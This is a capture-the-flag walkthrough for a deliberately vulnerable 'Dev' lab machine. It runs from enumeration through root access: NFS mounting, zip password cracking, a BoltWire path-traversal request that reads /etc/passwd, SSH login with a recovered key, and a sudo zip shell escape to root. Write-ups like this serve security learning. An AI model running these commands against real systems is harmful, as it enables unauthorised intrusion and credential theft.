### Dev machine by TCM

IP={target_IP}

Nmap scan: 
```
   PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41572/udp   mountd
|   100005  1,2,3      45424/udp6  mountd
|   100005  1,2,3      46903/tcp6  mountd
|   100005  1,2,3      54313/tcp   mountd
|   100021  1,3,4      33563/tcp6  nlockmgr
|   100021  1,3,4      39823/tcp   nlockmgr
|   100021  1,3,4      47204/udp6  nlockmgr
|   100021  1,3,4      55634/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
33311/tcp open  mountd   1-3 (RPC #100005)
39823/tcp open  nlockmgr 1-4 (RPC #100021)
54313/tcp open  mountd   1-3 (RPC #100005)
54861/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf -u http://{target_IP}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    

`/public`\
`/src`\
`/app`

### ffuf -u http://{target_IP}:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
`/dev`

We also have nfs here:\
`showmount -e {target_IP}`

lets create a folder /dev in /mnt\
`mkdir dev` and mount the file here\
`mount -t  nfs {target_IP}:/srv/nfs /mnt/dev`

and we have a file `save.zip`\
to unzip it we need a password

To crack it we need a tool fcrackzip (apt install fcrackzip)\
`fcrack -v -u -D -p /usr/share/wordlist/rockyou.txt save.zip`

we got a password:\
`PASSWORD FOUND!!!!: pw == java101`

lets unzip it:\
`unzip save.zip > java101`
and here we go, we have 2 files:
`id_rsa` and `todo.txt`

`cat todo.txt`
```
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```
From ffuf we have some path http://{target_IP}/app

lets go to config http://{target_IP}/app/config/

and we found
```
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
    
```


By browsing we found the exploit for BoltWire

https://www.exploit-db.com/exploits/48411

by dfollowing exploit step we got LFI:

http://{target_IP}:8080/dev/index.php?p=action.search&action=../../../../../etc/passwd


and we found the user\
`jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash`

We now know that user is `jeanpaul`, lets try to login via ssh:

ssh -i id_rsa jeanpaul@{target_IP}

the passphrase for id_rsa is `I_love_java`

and we got a ssh session.

---

Privilage Escalation

By typing `sudo -l`

we could privEsc via zip

Go to https://gtfobins.github.io/gtfobins/zip/

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

```

Run it in ssh session:
```
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
```

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat flag.txt
Congratz on rooting this box !
#` 
```
### Congrats!